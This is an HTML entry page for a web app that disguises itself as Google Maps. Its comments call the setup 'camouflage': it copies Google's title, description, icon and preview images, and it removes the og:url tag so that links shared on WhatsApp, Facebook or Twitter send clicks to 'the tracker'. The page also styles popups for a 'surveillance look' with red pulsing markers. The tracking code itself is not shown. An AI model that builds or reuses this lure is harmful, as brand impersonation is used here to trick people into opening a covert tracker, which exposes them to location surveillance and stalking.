<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    
    <!-- CAMOUFLAGE: Make the tab and social previews look like Google Maps -->
    <title>Google Maps</title>
    <meta name="description" content="Find local businesses, view maps and get driving directions in Google Maps.">
    
    <!-- Open Graph / Facebook / WhatsApp Preview -->
    <meta property="og:type" content="website">
    <!-- og:url removed so it defaults to the App's actual URL, ensuring clicks go to the tracker, not Google -->
    <meta property="og:title" content="Google Maps">
    <meta property="og:description" content="Find local businesses, view maps and get driving directions in Google Maps.">
    <meta property="og:image" content="https://www.google.com/images/branding/product/2x/maps_96in128dp.png">
    
    <!-- Twitter Preview -->
    <meta property="twitter:card" content="summary_large_image">
    <!-- twitter:url removed -->
    <meta property="twitter:title" content="Google Maps">
    <meta property="twitter:description" content="Find local businesses, view maps and get driving directions in Google Maps.">
    <meta property="twitter:image" content="https://www.google.com/images/branding/product/2x/maps_96in128dp.png">

    <!-- We keep Tailwind CDN for simplicity, or you can install it via PostCSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"
     integrity="sha256-p4NxAoJBhIIN+hmNHrzRCf9tD/miZyoHS5obTRR9BMY="
     crossorigin=""/>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="icon" href="https://www.google.com/images/branding/product/ico/maps15_bnuw3a_32dp.ico">
    <style>
      html, body, #root {
        height: 100%;
        width: 100%;
        margin: 0;
        padding: 0;
        overflow: hidden;
        background-color: #0f172a; /* Dark background to prevent white flash */
      }
      
      /* Smooth map fade in */
      .leaflet-container {
        background: #1a1a1a !important;
      }
      
      /* Custom Popup Style for Surveillance Look */
      .leaflet-popup-content-wrapper {
        border-radius: 4px;
        background: rgba(0, 0, 0, 0.8);
        color: #fff;
        backdrop-filter: blur(4px);
        border: 1px solid #333;
      }
      .leaflet-popup-tip {
        background: rgba(0, 0, 0, 0.8);
      }

      /* RED PULSING MARKER STYLES */
      .red-pulsing-marker {
        display: flex;
        justify-content: center;
        align-items: center;
        position: relative;
      }

      .dot-core {
        width: 14px;
        height: 14px;
        background-color: #ff0000;
        border: 2px solid #ffffff;
        border-radius: 50%;
        box-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000;
        z-index: 2;
      }

      .pulse-ring {
        position: absolute;
        width: 14px;
        height: 14px;
        border-radius: 50%;
        border: 2px solid #ff0000;
        box-shadow: 0 0 10px #ff0000;
        animation: pulse-animation 2s infinite cubic-bezier(0.25, 0.46, 0.45, 0.94);
        z-index: 1;
      }

      /* Second ring for more intense effect */
      .pulse-ring:nth-child(2) {
        animation-delay: 0.5s;
      }

      @keyframes pulse-animation {
        0% {
          transform: scale(1);
          opacity: 1;
        }
        100% {
          transform: scale(6); /* Expands out */
          opacity: 0;
        }
      }
    </style>
  <script type="importmap">
{
  "imports": {
    "react": "https://esm.sh/react@^19.2.3",
    "react-dom/": "https://esm.sh/react-dom@^19.2.3/",
    "react/": "https://esm.sh/react@^19.2.3/",
    "@supabase/supabase-js": "https://esm.sh/@supabase/supabase-js@^2.90.0",
    "react-leaflet": "https://esm.sh/react-leaflet@^5.0.0",
    "leaflet": "https://esm.sh/leaflet@^1.9.4",
    "vite": "https://esm.sh/vite@^7.3.1",
    "@vitejs/plugin-react": "https://esm.sh/@vitejs/plugin-react@^5.1.2",
    "express": "https://esm.sh/express@^5.2.1",
    "path": "https://esm.sh/path@^0.12.7",
    "fs": "https://esm.sh/fs@^0.0.1-security",
    "url": "https://esm.sh/url@^0.11.4"
  }
}
</script>
</head>
  <body>
    <div id="root"></div>
    <!-- Vite entry point -->
    <script type="module" src="/index.tsx"></script>
  </body>
</html>
